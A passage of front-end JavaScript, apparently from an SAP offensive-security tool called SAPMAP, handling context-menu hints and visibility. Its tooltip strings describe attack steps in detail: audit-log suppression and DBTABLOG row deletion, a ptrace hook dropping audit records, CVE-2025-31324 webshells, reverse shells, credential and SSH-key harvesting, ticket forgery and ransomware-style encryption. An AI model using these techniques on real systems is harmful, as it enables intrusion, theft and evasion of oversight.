         ? 'MUTATES kernel state. Calls RSAU_UPD_AUDIT_CONFIG to swap one or more active SAL slots\' UNAME filter (e.g. \'*\' → operator\'s real user) for a hold window. Slot stays STATUS=X (appears active in SM19) but no longer matches SAPMAP00. Stealth path only — shared memory write, no disk persistence. Baseline UNAMEs auto-restored on exit.'
         : ((mapState.evasion && mapState.evasion.allow_evasion)
            ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
    'tier3_java_sal_suppress':
        ((mapState.evasion && mapState.evasion.allow_evasion)
         ? 'MUTATES Java runtime. Deploys a LogController JSP and calls Category.setEffectiveSeverity(Severity.NONE) on the 6 Java Security Audit Log categories (/System/Security/Audit + ACLs, Configuration, PermissionCheck, PrincipalModification, UserMapping). Runtime-only — JVM heap, no config file, no NWA change-log. Auto-restores baseline severity after hold window. Requires a JSP deployment path.'
         : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
    'tier3_dbtablog_purge':
        ((mapState.evasion && mapState.evasion.allow_evasion)
         ? 'DELETES rows from DBTABLOG. Captures MAX(LOGID) baseline, sleeps hold_seconds (operator runs actions during this window — all table-logged DML lands in DBTABLOG normally), then DELETEs every row with LOGID > baseline (optionally narrowed by TABNAME whitelist). DBTABLOG is delivery class L (not itself logged) — DELETE does not recurse. No DD09L touch, no DDIC reactivation, no transport object. Self-managed baseline.'
         : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
    'tier3_sal_death_star_launch':
        (isWindows
         ? 'Windows kernel target — the C hook uses process_vm_readv + PTRACE_ATTACH which are Linux-only. Not supported on this OS.'
         : ((mapState.evasion && mapState.evasion.allow_evasion)
            ? ((n && n.death_star_hook_pid > 0)
               ? ('A Death Star hook is already armed on this node (hook PID ' + n.death_star_hook_pid + '). Disarm it first before re-arming.')
               : 'MUTATES disp+work in-memory. Uploads Julian Petersohn\'s sap_audit_hook.c to /tmp, compiles as <sid>adm, picks a dialog worker PID and ptrace-attaches. Plants INT3 breakpoints on the two fwrite calls, write_event_to_DB, and the three EtdSender calls in rsauwr1ex. In --suppress mode audit records matching the filter (or all events when empty) are silently dropped — SM20 never sees them, no disk write, no DB row, no ETD/SIEM. Persists as a background process on the target until Disarm. Requires Linux + <sid>adm + kernel.yama.ptrace_scope <= 1. Not a 0-day — SAP publicly confirmed this is post-exploitation.')
            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
    'tier3_sal_death_star_stop':
        (isWindows
         ? 'Windows target — no Linux ptrace hook was armed here.'
         : ((mapState.evasion && mapState.evasion.allow_evasion)
            ? ((n && n.death_star_hook_pid > 0)
               ? ('SIGTERM the running sap_audit_hook (hook PID ' + n.death_star_hook_pid + '). The hook\'s signal handler calls detach_all() which restores every INT3 byte in the target disp+work text segment and releases ptrace cleanly before exiting.')
               : 'No Death Star hook armed on this node — run "Arm Virtual SAP Death Star..." first.')
            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
    'retrieve_rfcs':    'Needs a verified RFC credential or a SAPMAP-created user — RSRFCCHK and the RFCDES read both require a working logon.',
    'test_rfcs':        (!hasRFCs
        ? 'Retrieve RFC connections first.'
        : 'Needs a verified RFC credential or a SAPMAP-created user.'),
    'read_java_destinations': (javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). System is hardened — data extraction not available from here.'
        : 'Requires Java/dual-stack + CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint'),
    'download_hashes':    (isJavaStack && !isAbapStack && javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). Hashes cannot be extracted from a Java-only hardened target.'
        : (isAbapStack
            ? 'Needs a verified RFC credential or a SAPMAP-created user — USR02 read needs an actual ABAP logon.'
            : 'Java stack: requires CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint.')),
    'download_secstore':  'Needs a verified RFC credential or a SAPMAP-created user — the RSECTAB read needs an actual ABAP logon.',
    'download_java_secstore': (javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). System is hardened — data extraction not available from here.'
        : 'Requires Java/dual-stack + CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint'),
    'view_java_secstore':     'Run Download Java Secure Store first',
    'download_table':     (isJavaStack && !isAbapStack && javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). Tables cannot be dumped from a Java-only hardened target.'
        : (isAbapStack
            ? 'Needs a verified RFC credential or a SAPMAP-created user — RFC_READ_TABLE needs an actual ABAP logon.'
            : 'Java stack: requires CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint.')),
    'impact_assess':      (!isAbapStack
        ? 'Run Business Impact Scenarios is ABAP-only — BSEG / LFBK / PA0008 are ABAP DDIC tables.'
        : 'Needs a verified RFC credential or a SAPMAP-created user — the impact scenarios run BAPI / RFC_READ_TABLE calls that require an actual logon.  node.pwned alone (e.g. via GW exploit before user creation) is not enough.'),
    'analyse_capabilities': (!isAbapStack
        ? 'Capability analyser is ABAP-only — it reads AGR_USERS / AGR_1251 / UST04 to map a user\'s privileges.  Java systems use a different role model.'
        : 'Needs a verified RFC credential or a SAPMAP-created user — the analyser reads AGR_USERS / UST04 via RFC.  Save credentials or create a user first.'),
    'impact_view':        'Run impact assessment first',
    'impact_assess_java': (javaDeployBlocked
        ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). System is hardened — data extraction not available from here.'
        : 'Requires Java/dual-stack + CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint'),
    'os_terminal':      'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), CVE-2025-31324 webshell (Java), SSH lateral movement, or SAPControl OSExecute from a verified Type-G destination',
    'file_browser':     'Requires an OS-exec path: vulnerable GW, ABAP+created-user, CVE-2025-31324 webshell, SSH lateral, or SAPControl OSExecute',
    'reverse_shell':    'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), or CVE-2025-31324 webshell (Java)',
    'ssh_harvest':      'Requires OS-exec on a Linux host — reads /etc/passwd + .ssh dirs via GW SAPXPG, CVE-2025-31324, or SXPG_STEP_XPG_START',
    'ssh_harvest_root': 'Requires a viable Linux LPE (Copy Fail / pedit-COW / Dirty Frag) — run "Escalate to Root" first. Reads ALL users\' .ssh directories as root.',
    'ssh_test_keys':    'Test previously harvested SSH keys against all map nodes — run SSH Harvest first',
    // ssh_plant_key removed (out of scope)
    'harvest_scc':          'Requires OS-exec on this node AND an SCC on the same host IP',
    'harvest_scc_hashes_via_lpe':
        (isWindows
          ? 'Linux LPE only — Copy Fail / pedit-COW / Dirty Frag are Linux techniques; this node is Windows.'
          : 'Needs OS-exec on this node, a viable Linux LPE (Copy Fail / pedit-COW / Dirty Frag), and an SCC on the same host. Run Check Linux Root LPE first.'),
    'harvest_scc_mappings': 'Requires OS-exec on this node AND an SCC on the same host IP',
    'create_tcpip':     (!isAbapStack
        ? 'Create TCP/IP Dest is ABAP-only — RFC Type-T destinations + RFC_DESTINATION_INSERT live on the ABAP stack.'
        : 'Needs a verified RFC credential or a SAPMAP-created user — RFC_DESTINATION_INSERT requires an actual logon.  Save credentials or create a user first.'),
    'propagate':        'Provide credentials or create a user first',
    'ransapware_encrypt': 'Needs ABAP stack + a verified RFC credential or SAPMAP-created user — RFC_ABAP_INSTALL_AND_RUN must be available.',
    'ransapware_decrypt': 'Needs ABAP stack + a verified RFC credential or SAPMAP-created user — RFC_ABAP_INSTALL_AND_RUN must be available.',
    'cleanup':          'No created users to clean up',
    'client_roles':     'Needs a verified RFC credential or a SAPMAP-created user — the role-walk reads AGR_USERS / AGR_DEFINE via RFC.',
    'read_usrextid':    'Needs a verified RFC credential or a SAPMAP-created user — USREXTID read uses RFC_READ_TABLE.',
    'verify_pp_impersonation': (() => {
      const links = n.scc_links || [];
      if (!links.length)
        return 'No SCC linked to this node — run Standard Scan + Pull Mappings on the SCC first.';
      const sccs = mapState.scc_nodes || {};
      const haveAnyAnalysis = links.some(h => {
        const sn = sccs[h];
        return sn && (sn.pp_analysis || {}).pp_config;
      });
      if (!haveAnyAnalysis)
        return 'Linked SCC has no PP analysis yet — Extract Keystore on the SCC first.';
      if (!(mapState.btp_token_regions || []).length)
        return 'No BTP token in memory — Mint BTP Token or paste a cf oauth-token first.';
      const exp = (n.pp_impersonation || {}).exploitability || '';
      if (exp === 'blocked')
        return 'PP analyser verdict is BLOCKED — no impersonation surface to verify.';
      return '';
    })(),
    // MYSAPSSO2 ticket-forgery workflow.  In current code these
    // items are HIDDEN (display:none) when prerequisites aren't
    // met, so these hints are mostly defensive — they'll only
    // surface if a future change drops them from the `hidden`
    // dict and falls back to the rules-based disable path.
    'forge_ticket': (!isAbapStack
        ? 'MYSAPSSO2 ticket forgery reads SAPSYS.pse — only present on ABAP/dual-stack systems.  Java stacks use SNC for Diag SSO instead.'
        : 'Needs OS-level read access on the issuing AS (sapxpg base64).  Open via a vulnerable RFC Gateway, CVE-2025-31324 JSP webshell, or a SAPMAP-created user first.'),
    'propagate_ticket': 'Requires both a forged MYSAPSSO2 ticket AND a SAPMAP-created user on this node.  The created user provides the RFC credential needed to discover the target’s ICM ports via FM ICM_GET_INFO before replaying the ticket.',
    'discover_strustsso2': 'Reads RFCTRUST, TWPSSO2ACL and USREXTID via RFC_READ_TABLE — needs a real RFC credential on this node.  Run Forge & Fanout (which discovers implicitly), or create a user first via GW exploit / 10KBLAZE / RECON, then come back.',
    'forge_and_fanout': (!isAbapStack
        ? 'Forge & Fanout reads SAPSYS.pse — only present on ABAP/dual-stack systems.'
        : 'Needs OS-level read access on the issuer (sapxpg base64) AND a RFC credential for STRUSTSSO2 discovery.  Open via a vulnerable RFC Gateway, CVE-2025-31324 JSP webshell, or a SAPMAP-created user first.'),
  };

  // Items hidden entirely (not just disabled) when the node type doesn't
  // match.  A workflow that's inapplicable on this stack type shouldn't
  // clutter the menu with grayed-out entries.
  const hidden = {
    // ABAP-only: these use BAPIs / DIAG / RFC-specific to the ABAP stack
    'credentials':      !isAbapStack,
    'enum_clients':     !isAbapStack,
    'client_roles':     !isAbapStack,
    'read_usrextid':    !isAbapStack,
    'default_creds':    !isAbapStack,
    'probe_telemetry':  !isAbapStack,
    'capture_evasion_baseline': !isAbapStack,
    'probe_rsau_api': !isAbapStack,
    'probe_rsau_dyn_profile': !isAbapStack,
    'tier3_sal_slot_disable': !isAbapStack,
    'tier3_gw_logging_off': !isAbapStack,
    'tier3_rdisp_trace_off': !isAbapStack,
    'tier3_sal_uname_narrow': !isAbapStack,
    'tier3_java_sal_suppress': !isJavaStack,
    'tier3_dbtablog_purge': !isAbapStack,
    // Death Star C hook uses Linux ptrace/procfs — hide on Windows targets.
    'tier3_sal_death_star_launch': isWindows,
    'tier3_sal_death_star_stop': isWindows,
    'retrieve_rfcs':    !isAbapStack,
    'test_rfcs':        !isAbapStack,
    'create_tcpip':          !isAbapStack,
    'create_user_creds':     !isAbapStack,
    'create_user_betrusted': !isAbapStack,
    'download_secstore':     !isAbapStack,  // RSECTAB is an ABAP table
    'ransapware_encrypt':    !isAbapStack,
    'ransapware_decrypt':    !isAbapStack,
    // create_user_gw stays visible on both ABAP and Java — click handler
    // dispatches to the right backend (ABAP USR02 SQL insert vs. Java UME
    // via JSP), and is hidden only on non-ABAP/non-Java stacks.
    'create_user_gw':        !(isAbapStack || isJavaStack),
    // SAProuter-only: reads the ROUTER_ADM info page
    'check_router_info': !isSaprouter,
    // Items that don't apply to a standalone Web Dispatcher (no
    // message server, no JCo destinations, no SecStore): hide them
    // outright on pure-WD nodes so the menu stays tidy.
    'check_ms':         !!n.is_web_dispatcher
                          && !isAbapStack && !isJavaStack,
    // Harvest BTP Credentials — hide whenever the action can't
    // meaningfully run.  Operator feedback: it was previously
    // shown on every ABAP+Java node even though the backend
    // requires an ABAP RFC logon (verified credential or
    // SAPMAP-created user) to read OA2C_CLIENT[_EXT] + RSECTAB.
    // Tighten to !hasUsableAbapAccess — this subsumes both:
    //   (a) Java-only stacks (no OA2C, no native BTP OAuth
    //       client storage)
    //   (b) Standalone WDs (no ABAP, can never have a usable
    //       ABAP credential)
    // ...so the older pure-WD test is no longer needed.
    'harvest_btp_creds': !hasUsableAbapAccess,
    // WD-specific management actions — only meaningful on a
    // dedicated Web Dispatcher node.  Hide outright on ABAP /
    // Java / SAProuter / HANA so the menu doesn't carry options
    // that can never do anything useful on those nodes.
    //
    // Gate strictly on system_type === 'WEB_DISPATCHER' (not on
    // n.is_web_dispatcher) — the underlying sapwd/sapwebdisp binary
    // is shared between dedicated WDs and Java NetWeaver ICMs, so a
    // Java instance's ICM port (e.g. J75:50000) often fingerprints
    // as a WD and flips is_web_dispatcher=True even though
    // /sap/wdisp/admin doesn't actually exist on that node.
    // Operator-reported regression: J75 (system_type=JAVA) was
    // showing the WD menu items because the JAVA ICM fingerprinted
    // as a WD.
    'wd_rediscover':           !isWebDispatcher,
    'wd_admin_creds':          !isWebDispatcher,
    'wd_admin_probe_defaults': !isWebDispatcher,
    'wd_extract_icmauth':      !isWebDispatcher,
    // ICMAD bypass + heapdump pull — only the WD path makes sense
    // for the smuggle-vs-permission_table primitive (per SAP Note
    // 3123396 scenarios 2-5).  A pure ABAP / Java node without a
    // gateway in front has no permission_table to bypass.  The
    // detection probe (check_cve_22536) stays visible everywhere
    // — the bug is in the ICM itself and detection applies broadly.
    'icmad_acl_bypass':        !n.is_web_dispatcher,
    'icmad_heapdump_pull':     !n.is_web_dispatcher,
    // Java-only (dual-stack also counts as Java here).  Relax the
    // hide rule when we have a verified SAPControl OSExecute pivot
    // targeting this node — the operator has already proven they
    // have OS shell as <sid>adm.  Placeholder targets from Type-G
    // materialisation land with system_type='' and would otherwise
    // hide the whole Java flyout even after pwn confirmed.
    'download_java_secstore':     !isJavaStack && !hasSapControlOsExec,
    'view_java_secstore':         !isJavaStack && !hasSapControlOsExec,
    'read_java_destinations':     !isJavaStack && !hasSapControlOsExec,
    'check_cve_6287':             !isJavaStack,
    'check_cve_31324':            !isJavaStack,
    'exploit_cve_31324_drop':     !isJavaStack,
    'analyse_capabilities':       !isAbapStack,
    'set_telnet_override':        !isJavaStack,
    'impact_assess':              !isAbapStack,
    'lpe':                        !isAbapStack,
    'impact_assess_java':         !isJavaStack,
    'check_linux_lpe':   isWindows,
    'exploit_linux_lpe': isWindows,
    'check_windows_lpe':   !isWindows,
    'exploit_windows_lpe': !isWindows,
    'ssh_harvest':       isWindows,
    'ssh_harvest_root':  isWindows,
    'ssh_test_keys':     isWindows,
    // ssh_plant_key removed (out of scope)
    // SCC harvest items — hidden entirely unless an SCC is on the same host
    'harvest_scc':          !_hasSccOnSameHost(n),
    'harvest_scc_hashes_via_lpe': !_hasSccOnSameHost(n),
    'harvest_scc_mappings': !_hasSccOnSameHost(n),
    'harvest_scc_ssfs':     !_hasSccOnSameHost(n),
    // SCC submenu items — hidden when no SCC on same host
    'scc_via_sap_set_credentials':   !_hasSccOnSameHost(n),
    'scc_via_sap_probe_creds':       !_hasSccOnSameHost(n),
    'scc_via_sap_pull_mappings':     !_hasSccOnSameHost(n),
    'scc_via_sap_probe_mappings':    !_hasSccOnSameHost(n),
    'scc_via_sap_extract_keystore':  !_hasSccOnSameHost(n),
    'scc_via_sap_download_hashes':   !_hasSccOnSameHost(n),
    // MYSAPSSO2 ticket-forgery workflow — hide entirely on nodes
    // where the prerequisites can never be met.  Operators
    // explicitly requested invisibility (vs grey + tooltip) so
    // the menu doesn't show actions that would only fail at the
    // backend.  See the matching ``rules`` entries for the same
    // gating logic in disabled-state form (defensive double-up).
    'forge_ticket':       !(isAbapStack && (hasGwVuln
                              || hasCve31324
                              || hasCreatedUsers)),
    'propagate_ticket':   !((n.forged_tickets || []).length > 0 && hasCreatedUsers),
    // Note: harvest_btp_creds is gated above (alongside check_ms)
    // — moved next to the WD-context block since the gating logic
    // shares the same "needs a usable RFC logon" requirement.
  };

  // Apply visibility + enable/disable state to each menu item
  menu.querySelectorAll('.ctx-item[data-action]').forEach(item => {
    const action = item.getAttribute('data-action');
    if (hidden[action]) {
      item.style.display = 'none';
      return;
    }
    item.style.display = '';
    const enabled = rules[action] !== false;
    if (enabled) {
      item.classList.remove('disabled');
      item.removeAttribute('title');
    } else {
      item.classList.add('disabled');
      item.setAttribute('title', hints[action] || 'Not available');
    }
  });

  // Hide any submenu group whose actions are all hidden OR all greyed
  // out — avoids showing a parent label like "Business Impact" /
  // "Data Extraction" / "Cloud Connector" that opens to a flyout where
  // nothing is actionable.  Operator feedback: an all-greyed flyout is
  // just visual noise that wastes a click.
  //
  // An item counts as "actionable" when it is BOTH visible
  // (style.display !== 'none') AND enabled (not carrying the .disabled
  // class).  When every [data-action] in a .ctx-sub fails one or both
  // checks, the parent .ctx-group is collapsed entirely.
  //
  // Uses direct .style.display + classList checks rather than attribute
  // selectors because browsers normalise inline styles inconsistently
  // (with/without a space after the colon, with/without trailing
  // semicolon) and [style*="display: none"] misses some of those forms.
  menu.querySelectorAll('.ctx-group').forEach(group => {
    const sub = group.querySelector('.ctx-sub');
    if (!sub) return;   // not a submenu — leave alone
    // Items may live as DIRECT children of .ctx-sub (initial state)
    // OR inside a .ctx-sub-scroll wrapper that _attachScrollHints
    // injects when the menu overflows. Search both -- the descendant
    // selector below covers either case without false positives,
    // since .ctx-sub never contains nested .ctx-group structures.
    const all = sub.querySelectorAll('.ctx-item[data-action]');
    let actionable = 0;
    all.forEach(it => {
      if (it.style.display === 'none') return;
      if (it.classList.contains('disabled')) return;
      actionable++;
    });
    group.style.display = actionable === 0 ? 'none' : '';
  });

  // Show existing credentials / created users in the menu
  let oldInfo = menu.querySelector('.ctx-cred-info');
  if (oldInfo) oldInfo.remove();
  if (n && hasCreds) {
    const info = document.createElement('div');
    info.className = 'ctx-cred-info';
    info.style.cssText = 'padding:4px 12px;font-size:10px;color:#8b949e;border-top:1px solid #30363d;pointer-events:none';
    let lines = [];
    // Build a (username, client) \u2192 CreatedUser lookup so we can
    // merge the "created" marker into the credentials line instead
    // of showing the same user twice.  Since track_created_user now
    // pins a verified Credentials for every CreatedUser, every
    // created user has a matching credentials row \u2014 listing both
    // used to render as two lines for the same underlying account
    // (see feedback screenshot).
    const createdMap = {};
    for (const u of (n.created_users || [])) {
      const k = `${(u.username || '').toUpperCase()}|${(u.client || '').padStart(3, '0')}`;
      createdMap[k] = u;
    }
    const shownCreated = new Set();
    for (const c of (n.credentials || [])) {
      const mark = c.verified ? '\u2705' : '\u274C';
      const k = `${(c.username || '').toUpperCase()}|${(c.client || '').padStart(3, '0')}`;
      const cu = createdMap[k];
      const suffix = cu
        ? ` \u26A1 (created via ${escHtml(cu.method || 'unknown')})`
        : '';
      lines.push(`${mark} ${c.username} / client ${c.client} / inst ${c.instance_nr}${suffix}`);
      if (cu) shownCreated.add(k);
    }
    // Any created user that has no matching credentials row (edge
    // case \u2014 e.g. cred was manually removed but the CreatedUser
    // audit record survived) still deserves a line.
    for (const u of (n.created_users || [])) {
      const k = `${(u.username || '').toUpperCase()}|${(u.client || '').padStart(3, '0')}`;
      if (shownCreated.has(k)) continue;
      lines.push(`\u26A1 ${u.username} / client ${u.client} (created, no live cred)`);
    }
    if (lines.length) info.innerHTML = lines.join('<br>');
    // Insert after the "Provide Credentials" item
    const credItem = menu.querySelector('[data-action="credentials"]');
    if (credItem && credItem.nextSibling) {
      credItem.parentNode.insertBefore(info, credItem.nextSibling);
    } else {
      menu.appendChild(info);
    }
  }

  // Suggested next actions (contextual guidance)
  let oldSugg = menu.querySelector('.ctx-suggested');
  if (oldSugg) oldSugg.remove();
  const suggestions = getSuggestedActions(n, sid);
  if (suggestions.length > 0) {
    const suggDiv = document.createElement('div');
    suggDiv.className = 'ctx-suggested';
    suggDiv.innerHTML = '<div class="ctx-suggested-hdr">Suggested Next</div>'
      + suggestions.map(s =>
        `<div class="ctx-suggest-item" data-action="${s.action}">${s.icon} ${s.label}</div>`
      ).join('');
    menu.insertBefore(suggDiv, menu.firstChild);
  }

  // Highlight matching items in submenus
  menu.querySelectorAll('.ctx-item.ctx-highlighted').forEach(el => el.classList.remove('ctx-highlighted'));
  const suggActions = new Set(suggestions.map(s => s.action));
  menu.querySelectorAll('.ctx-item[data-action]').forEach(item => {
    if (suggActions.has(item.getAttribute('data-action'))) item.classList.add('ctx-highlighted');
  });

  // Position menu within viewport — measure actual height
  menu.classList.add('visible');
  const menuRect = menu.getBoundingClientRect();
  let menuX = e.clientX, menuY = e.clientY;
  if (menuX + menuRect.width > window.innerWidth) menuX = window.innerWidth - menuRect.width - 4;
  if (menuY + menuRect.height > window.innerHeight) menuY = window.innerHeight - menuRect.height - 4;
  if (menuY < 0) { menuY = 0; menu.style.maxHeight = window.innerHeight + 'px'; menu.style.overflowY = 'auto'; }
  else { menu.style.maxHeight = ''; menu.style.overflowY = ''; }
  menu.style.left = menuX + 'px';
  menu.style.top = menuY + 'px';

  // Flip flyout submenus left if they would overflow horizontally,
  // and up if they would overflow vertically — measured on the
  // actual <ctx-group> positions in the now-visible menu.
  _reflowSubmenus(menu, menuX, menuRect.width);
}

// Compute submenu flip flags for every <ctx-group> in a menu, AND
// set an inline max-height that matches the actual available space
// in the chosen direction.  Without the explicit max-height bound,
// a tall submenu in flip-up mode would grow freely above the parent
// row and clip off the TOP of the viewport (where it sits BEHIND
// the browser chrome and can't be scrolled into view).
//
// Used by showCtxMenu / showSCCCtxMenu / showBTPCtxMenu after the
// parent menu has been positioned so getBoundingClientRect returns
// final coordinates.
function _reflowSubmenus(menu, menuX, menuWidth) {
  const SAFE = 8;  // px gutter to keep the submenu off the edges
  menu.querySelectorAll('.ctx-group').forEach(group => {
    const sub = group.querySelector('.ctx-sub');
    if (!sub) return;
    sub.classList.remove('flip-left');
    sub.classList.remove('flip-up');
    sub.style.maxHeight = '';
    sub.style.overflowY = '';

    // Measure the submenu's natural dimensions by briefly showing it
    const prevDisplay = sub.style.display;
    const prevVis = sub.style.visibility;
    sub.style.display = 'block';
    sub.style.visibility = 'hidden';
    const naturalW = sub.offsetWidth;
    const naturalH = sub.scrollHeight;
    sub.style.display = prevDisplay;
    sub.style.visibility = prevVis;

    // Horizontal: flip left if the submenu would overflow the right
    // edge.  Use measured width instead of hardcoded min-width.
    if (menuX + menuWidth + naturalW > window.innerWidth) {
      sub.classList.add('flip-left');
    }

    // Vertical: cap to available space, flip up if that gives more room.
    // The submenu is offset by top:-4px, and has padding (8px) + border
    // (2px) that don't count toward content height — subtract them so
    // the last item isn't clipped by the viewport edge.
    const groupRect = group.getBoundingClientRect();
    const PAD = 14;  // 4px top-offset + 8px padding + 2px border
    const spaceDown = window.innerHeight - groupRect.top - SAFE - PAD;
    const spaceUp = groupRect.bottom - SAFE - PAD;
    const wantsFlipUp = (naturalH > spaceDown) && (spaceUp > spaceDown);
    if (wantsFlipUp) {
      sub.classList.add('flip-up');
      sub.style.maxHeight = Math.max(spaceUp, 120) + 'px';
    } else {
      sub.style.maxHeight = Math.max(spaceDown, 120) + 'px';
    }
    sub.style.overflowY = 'auto';
    _attachScrollHints(sub);
  });
}

// Inject ▲ / ▼ scroll-affordance chevrons into a scrollable submenu.
//
// To make the chevrons stay pinned to the VISIBLE viewport (not scroll
// with content), the items have to be wrapped in an inner scroller --
// .ctx-sub becomes a fixed-size positioning context with overflow:visible,
// the inner .ctx-sub-scroll handles the actual scrolling, and the
// chevrons are absolute-positioned direct children of .ctx-sub layered
// on top of the scroller.
//
// Idempotent: re-running on the same .ctx-sub reuses the wrapper, just
// re-measures and updates the hint state.
function _attachScrollHints(sub) {
  // Lazy-create the inner scroller and move all existing items into it.
  let scroller = sub.querySelector(':scope > .ctx-sub-scroll');
  if (!scroller) {
    scroller = document.createElement('div');
    scroller.className = 'ctx-sub-scroll';
    // Move every existing child (the menu items) into the scroller.
    // The chevron nodes don't exist yet at this point.
    const kids = Array.from(sub.childNodes);
    kids.forEach(k => scroller.appendChild(k));
    sub.appendChild(scroller);
  }
  // Transfer the just-computed scroll/maxHeight from sub to scroller,
  // then let sub itself stop being a scroll container so its absolute
  // children (the chevrons) overlay the visible viewport.
  if (sub.style.maxHeight) {
    scroller.style.maxHeight = sub.style.maxHeight;
    sub.style.maxHeight = '';
  }
  scroller.style.overflowY = 'auto';
  sub.style.overflowY = 'visible';

  // Overflow detection needs the elements LAID OUT -- sub is normally
  // display:none (CSS hides flyouts until :hover). scrollHeight and
  // clientHeight both read 0 in that state, so without forcing layout
  // here, overflows would always be false and the chevrons would never
  // be added.
  // Both the overflow check AND the initial at-top/at-bottom state
  // must be measured inside this force-layout block. Outside it,
  // scrollHeight=clientHeight=0, which would (a) fail overflow
  // detection and (b) compute at-bottom = (0+0 >= 0-1) = true, hiding
  // the bottom chevron until the operator scrolls the live menu and
  // the scroll listener fires with real values.
  const prevDisplay = sub.style.display;
  const prevVis = sub.style.visibility;
  sub.style.display = 'block';
  sub.style.visibility = 'hidden';
  const overflows = scroller.scrollHeight > scroller.clientHeight + 1;
  const initialAtTop = scroller.scrollTop <= 1;
  const initialAtBottom = (
    scroller.scrollTop + scroller.clientHeight
      >= scroller.scrollHeight - 1);
  sub.style.display = prevDisplay;
  sub.style.visibility = prevVis;
  sub.classList.toggle('has-overflow', overflows);
  if (!overflows) {
    sub.querySelectorAll(':scope > .ctx-scroll-hint').forEach(
      n => n.remove());
    sub.classList.remove('at-top', 'at-bottom');
    return;
  }
  // Inject hints once, as direct children of .ctx-sub (NOT scroller)
  if (!sub.querySelector(':scope > .ctx-scroll-hint.top')) {
    const top = document.createElement('div');
    top.className = 'ctx-scroll-hint top';
    top.textContent = '▲';
    sub.appendChild(top);
    const bot = document.createElement('div');
    bot.className = 'ctx-scroll-hint bottom';
    bot.textContent = '▼  more  ▼';
    sub.appendChild(bot);
  }
  // Apply the initial state captured in the force-layout block above.
  // Don't re-measure here -- sub is back to display:none and every
  // metric reads zero.
  sub.classList.toggle('at-top', initialAtTop);
  sub.classList.toggle('at-bottom', initialAtBottom);
  // Subsequent updates from scroll events run while sub is :hover
  // visible, so direct measurement works there.
  const update = () => {
    sub.classList.toggle('at-top', scroller.scrollTop <= 1);
    sub.classList.toggle(
      'at-bottom',
      scroller.scrollTop + scroller.clientHeight
        >= scroller.scrollHeight - 1);
  };
  if (!scroller.dataset.scrollHintWired) {
    scroller.addEventListener('scroll', update, { passive: true });
    scroller.dataset.scrollHintWired = '1';
  }
}

function hideCtxMenu() {
  document.getElementById('ctx-menu').classList.remove('visible');
  if (window._hideCtxTooltip) _hideCtxTooltip();
}

(function() {
  const tip = document.getElementById('ctx-tooltip');
  function show(e) {
    const item = e.target.closest('.ctx-item');
    if (!item) { hide(); return; }
    // On first hover, migrate title → data-tip to suppress native tooltip
    if (item.hasAttribute('title')) {
      item.setAttribute('data-tip', item.getAttribute('title'));
      item.removeAttribute('title');
    }
    const text = item.getAttribute('data-tip');
    if (!text) { hide(); return; }
    tip.textContent = text;
    const r = item.getBoundingClientRect();
    let left = r.right + 8;
    let top = r.top;
    if (left + 390 > window.innerWidth) left = Math.max(8, r.left - 390);
    if (top + 120 > window.innerHeight) top = Math.max(8, window.innerHeight - 160);
    tip.style.left = left + 'px';
    tip.style.top = top + 'px';
    tip.classList.add('visible');
  }
  function hide() { tip.classList.remove('visible'); }
  window._hideCtxTooltip = hide;
  ['ctx-menu', 'scc-ctx-menu', 'btp-ctx-menu', 'tms-ctx-menu', 'dbcon-ctx-menu'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('mouseover', show);
    el.addEventListener('mouseout', function(e) {
      if (!e.relatedTarget || !el.contains(e.relatedTarget)) hide();
    });
  });
})();

function hideTMSCtxMenu() {
  const el = document.getElementById('tms-ctx-menu');
  if (el) el.classList.remove('visible');
}

function hideDBCONCtxMenu() {
  const el = document.getElementById('dbcon-ctx-menu');
  if (el) el.classList.remove('visible');
}

// Delegate clicks from context menu items
document.getElementById('ctx-menu').addEventListener('click', function(e) {
  const item = e.target.closest('.ctx-item[data-action], .ctx-suggest-item[data-action]');
  if (!item || item.classList.contains('disabled')) return;
  ctxAction(item.getAttribute('data-action'));
});

// --- SAP Cloud Connector context menu ---
let selectedSccHost = null;

function getSCCSuggestedActions(sn, host) {
  // Phase 5: SCC — walks operator through the SCC assessment workflow.
  if (!sn) return [];
  const suggestions = [];
  const hasCreds = (sn.credentials || []).length > 0;
  const credsTried = hasCreds || !!sn.admin_session_obtained
                     || !!sn.default_creds_live;
  const hasMappings = (sn.mappings || []).length > 0;
  // "Probed" heuristic: any mapping row with a probe_signature / reachable
  // flag set means Probe Mappings has run.
  const mappingsProbed = (sn.mappings || []).some(m =>
    m && (m.reachable !== undefined || m.probe_signature
          || m.last_probed_at));

  // 1. Never tried default creds → probe them.
  if (!credsTried)
    suggestions.push({icon: '🔑', label: 'Probe Default Account', action: 'scc_probe_creds'});

  // 2. Authenticated (creds captured OR default_creds_live) but no
  //    mappings pulled yet → pull mappings.
  if (credsTried && !hasMappings)
    suggestions.push({icon: '📁', label: 'Pull Mappings', action: 'scc_pull_mappings'});

  // 3. Mappings pulled but never probed → smoke-test backend reachability.
  if (hasMappings && !mappingsProbed)
